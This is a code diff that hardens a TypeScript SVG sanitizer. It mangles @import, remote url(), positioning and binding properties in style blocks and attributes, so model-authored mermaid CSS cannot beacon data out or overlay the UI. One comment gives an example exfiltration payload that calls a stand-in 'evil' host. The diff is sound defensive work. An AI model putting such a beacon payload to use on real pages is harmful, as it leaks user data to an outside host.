@@ -96,5 +96,50 @@ const SVG_PURIFY_CONFIG: Config = {
  *  markup/labels; strips scripting and event handlers. */
 export function sanitizeSvg(svg: string | null | undefined): string {
   if (!svg) return "";
-  return DOMPurify.sanitize(svg, SVG_PURIFY_CONFIG);
+  const clean = DOMPurify.sanitize(svg, SVG_PURIFY_CONFIG);
+  // A <style> element inside an SVG is NOT scoped to the SVG — it applies to
+  // the whole document, and this output lands in the privileged main window.
+  // Model-authored CSS (mermaid `%%{init: {"themeCSS": …}}%%` flows here)
+  // must not reach the app's real stylesheet: @import/url() load remote
+  // resources (beacon/exfil; CSP's `img-src https:` would allow them), and
+  // position:fixed/absolute overlays can redress the entire UI. Mangle the
+  // dangerous constructs instead of dropping the <style> element so the
+  // diagram's own class rules (node/fill/stroke/font) keep working.
+  // DOMPurify output is serialized from a parsed DOM, so a <style> element's
+  // content is plain text and cannot itself contain "</style>" — the regex
+  // below cannot run past the real element end.
+  return clean
+    .replace(
+      STYLE_BLOCK_RE,
+      (_m, open: string, css: string, close: string) =>
+        `${open}${neutralizeMainDocCss(css)}${close}`,
+    )
+    // Inline style attributes on SVG nodes are a second path to the same
+    // vectors (e.g. `style="fill: url(https://evil/?leak)"` beacons through
+    // CSP's permissive img-src). Attribute values in DOMPurify's serialized
+    // output are double-quoted with any inner quote escaped, so `[^"]*`
+    // cannot overrun the attribute.
+    .replace(
+      STYLE_ATTR_RE,
+      (_m, pre: string, val: string, post: string) =>
+        `${pre}${neutralizeMainDocCss(val)}${post}`,
+    );
+}
+
+const STYLE_BLOCK_RE = /(<style[^>]*>)([\s\S]*?)(<\/style>)/gi;
+const STYLE_ATTR_RE = /(\sstyle\s*=\s*")([^"]*)(")/gi;
+
+/// Neutralize the CSS constructs that only matter when a style block reaches
+/// the MAIN document. Fragment references (`filter: url(#arrow)`) survive —
+/// mermaid uses them for markers/filters; everything remote or
+/// overlay-capable is mangled into an invalid property/function name so the
+/// CSS parser drops exactly that declaration.
+export function neutralizeMainDocCss(css: string): string {
+  return css
+    .replace(/@import[^;]*;?/gi, "/* removed: @import */")
+    .replace(/@charset[^;]*;?/gi, "/* removed: @charset */")
+    // `url(` whose argument is not a `#fragment` → invalid function.
+    .replace(/\burl\(\s*(['"]?)\s*(?!#)/gi, "refused-url($1")
+    .replace(/([;{\s"'])position\s*:/gi, "$1refused-position:")
+    .replace(/\b(behavior|-moz-binding)\s*:/gi, "refused-$1:");
 }
